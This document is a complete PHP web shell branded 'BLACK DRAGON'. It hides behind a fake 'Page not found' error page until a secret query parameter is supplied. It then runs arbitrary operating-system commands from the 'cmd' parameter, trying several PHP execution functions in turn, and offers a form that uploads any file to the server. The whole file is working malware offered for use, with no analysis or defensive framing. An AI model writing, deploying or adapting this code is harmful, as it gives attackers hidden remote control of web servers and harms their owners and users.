<?php
@error_reporting(0);@set_time_limit(0);$p='BDGK'.md5('blackdragon');
if(!isset($_GET['nagahitam'])){http_response_code(404);echo"<!DOCTYPE html><html><head><title>Page not found</title></head><body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'><div style='max-width:560px;margin:80px auto;padding:24px'><h1 style='font-size:23px;font-weight:400'>Page not found</h1><p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p></div></body></html>";return;}
if(isset($_GET['h'])&&$_GET['h']==='bd'){header('Content-Type: text/plain; charset=utf-8');echo$p;return;}
if(isset($_GET['cmd'])&&$_GET['cmd']!==''){header('Content-Type: text/plain; charset=utf-8');$c=$_GET['cmd'];$o=false;
if(function_exists('shell_exec'))$o=@shell_exec($c.' 2>&1');
elseif(function_exists('system')){ob_start();@system($c.' 2>&1');$o=ob_get_clean();}
elseif(function_exists('passthru')){ob_start();@passthru($c.' 2>&1');$o=ob_get_clean();}
elseif(function_exists('exec')){$a=array();@exec($c.' 2>&1',$a);$o=implode("\n",$a);}
elseif(function_exists('proc_open')){$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$pr=@proc_open($c,$d,$pi);if(is_resource($pr)){$o=stream_get_contents($pi[1]);fclose($pi[0]);fclose($pi[1]);fclose($pi[2]);proc_close($pr);}}
echo$o!==false?$o:'[ERR] all exec functions disabled';return;}
echo'<!DOCTYPE html><html><head><title>404</title><meta charset="utf-8"></head><body style="margin:0;background:#0a0a0f;color:#c084fc;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh"><div style="text-align:center"><h2>BLACK DRAGON</h2><form action="" method="post" enctype="multipart/form-data"><input type="file" name="file"><button type="submit" name="_upl" value="Upload">Upload</button></form>';
if(isset($_POST['_upl'])&&$_POST['_upl']==='Upload'&&isset($_FILES['file'])&&$_FILES['file']['error']===UPLOAD_ERR_OK){
$de=dirname(__FILE__).'/'.basename($_FILES['file']['name']);
if(@copy($_FILES['file']['tmp_name'],$de))echo'<p style="color:#0f0">[OK] '.htmlspecialchars(basename($_FILES['file']['name'])).'</p>';else echo'<p style="color:#f00">[ERR]</p>';}
echo'</div></body></html>';
?>